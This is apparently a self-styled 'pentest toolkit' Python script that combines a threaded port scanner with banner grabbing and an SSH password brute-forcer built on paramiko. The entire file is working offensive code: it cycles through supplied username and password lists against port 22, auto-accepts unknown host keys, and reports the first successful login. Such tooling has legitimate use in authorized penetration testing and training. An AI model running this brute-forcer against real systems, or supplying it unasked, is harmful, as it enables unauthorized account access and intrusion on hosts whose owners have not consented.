import socket
import logging
from concurrent.futures import ThreadPoolExecutor
import paramiko
import pyfiglet
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format=f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(levelname)s - %(message)s')

# Function to display a logo
def display_logo():
    logo = pyfiglet.figlet_format("PENTEST TOOLKIT PS")
    print(f"{Fore.GREEN}{logo}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Created by Premkumar Soni{Style.RESET_ALL}\n")

# Function to scan a port and attempt banner grabbing
def scan_port(ip, port, timeout=1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"{Fore.GREEN}Port {port} is open on {ip}{Style.RESET_ALL}")
                try:
                    sock.sendall(b'HEAD / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
                    banner = sock.recv(1024).decode().strip()
                    print(f"{Fore.YELLOW}Banner for port {port} on {ip}: {banner}{Style.RESET_ALL}")
                except socket.timeout:
                    print(f"{Fore.RED}Timeout while grabbing banner for port {port} on {ip}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error grabbing banner for port {port} on {ip}: {e}{Style.RESET_ALL}")
    except socket.timeout:
        print(f"{Fore.RED}Timeout while scanning port {port} on {ip}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error scanning port {port} on {ip}: {e}{Style.RESET_ALL}")

# Function to scan multiple ports concurrently
def port_scan(ip, start_port, end_port, timeout=1):
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(start_port, end_port + 1):
            executor.submit(scan_port, ip, port, timeout)

# Function to load credentials from a file
def load_credentials_from_file(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}Error reading file {filepath}: {e}{Style.RESET_ALL}")
        return []

# Function to brute-force SSH login
def brute_force_ssh(ip, username_list, password_list, timeout=1):
    for username in username_list:
        for password in password_list:
            try:
                print(f"{Fore.CYAN}Attempting SSH login with username: {username} and password: {password} on {ip}:22{Style.RESET_ALL}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add missing host keys

                try:
                    client.connect(ip, port=22, username=username, password=password, timeout=timeout)
                    print(f"{Fore.GREEN}Successful SSH login with username: {username} and password: {password} on {ip}:22{Style.RESET_ALL}")
                    return
                except paramiko.AuthenticationException:
                    print(f"{Fore.RED}Failed SSH login with username: {username} and password: {password} on {ip}:22{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error connecting to {ip}:22 for SSH brute force: {e}{Style.RESET_ALL}")
                finally:
                    client.close()
            except Exception as e:
                print(f"{Fore.RED}Error brute-forcing SSH on {ip}:22 with username: {username} and password: {password}: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        display_logo()

        # User selects what operation to perform
        operation = input(f"{Fore.CYAN}Select operation:\n1. Port Scan\n2. SSH Brute Force\nEnter choice (1/2): {Style.RESET_ALL}").strip()

        if operation == '1':
            target_ip = input(f"{Fore.CYAN}Enter the target IP address or hostname ( ex :testphp.vulnweb.com): {Style.RESET_ALL}").strip()
            start_port = int(input(f"{Fore.CYAN}Enter the start port: {Style.RESET_ALL}").strip())
            end_port = int(input(f"{Fore.CYAN}Enter the end port: {Style.RESET_ALL}").strip())
            timeout = float(input(f"{Fore.CYAN}Enter the timeout for each port scan (in seconds): {Style.RESET_ALL}").strip())
            port_scan(target_ip, start_port, end_port, timeout)

            # Ask if user wants to perform SSH brute-force after port scanning
            brute_force_option = input(f"{Fore.CYAN}Do you want to perform SSH brute-forcing on port 22 after port scan? (yes/no): {Style.RESET_ALL}").strip().lower()
            if brute_force_option == 'yes':
                method = input(f"{Fore.CYAN}Do you want to use a file or enter credentials manually? (file/manual): {Style.RESET_ALL}").strip().lower()

                if method == 'file':
                    username_file = input(f"{Fore.CYAN}Enter the path to the username file: {Style.RESET_ALL}").strip()
                    password_file = input(f"{Fore.CYAN}Enter the path to the password file: {Style.RESET_ALL}").strip()
                    username_list = load_credentials_from_file(username_file)
                    password_list = load_credentials_from_file(password_file)
                else:
                    username_list = input(f"{Fore.CYAN}Enter the list of usernames (comma-separated): {Style.RESET_ALL}").strip().split(',')
                    password_list = input(f"{Fore.CYAN}Enter the list of passwords (comma-separated): {Style.RESET_ALL}").strip().split(',')

                brute_force_ssh(target_ip, username_list, password_list, timeout=1)

        elif operation == '2':
            target_ip = input(f"{Fore.CYAN}Enter the target IP address for SSH brute-force: {Style.RESET_ALL}").strip()
            brute_force_option = input(f"{Fore.CYAN}Do you want to perform SSH brute-forcing on port 22? (yes/no): {Style.RESET_ALL}").strip().lower()
            if brute_force_option == 'yes':
                method = input(f"{Fore.CYAN}Do you want to use a file or enter credentials manually? (file/manual): {Style.RESET_ALL}").strip().lower()

                if method == 'file':
                    username_file = input(f"{Fore.CYAN}Enter the path to the username file: {Style.RESET_ALL}").strip()
                    password_file = input(f"{Fore.CYAN}Enter the path to the password file: {Style.RESET_ALL}").strip()
                    username_list = load_credentials_from_file(username_file)
                    password_list = load_credentials_from_file(password_file)
                else:
                    username_list = input(f"{Fore.CYAN}Enter the list of usernames (comma-separated): {Style.RESET_ALL}").strip().split(',')
                    password_list = input(f"{Fore.CYAN}Enter the list of passwords (comma-separated): {Style.RESET_ALL}").strip().split(',')

                brute_force_ssh(target_ip, username_list, password_list, timeout=1)

        else:
            print(f"{Fore.RED}Invalid choice! Please select either 1 or 2.{Style.RESET_ALL}")

    except ValueError as e:
        print(f"{Fore.RED}Invalid input: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An unexpected error occurred: {e}{Style.RESET_ALL}")
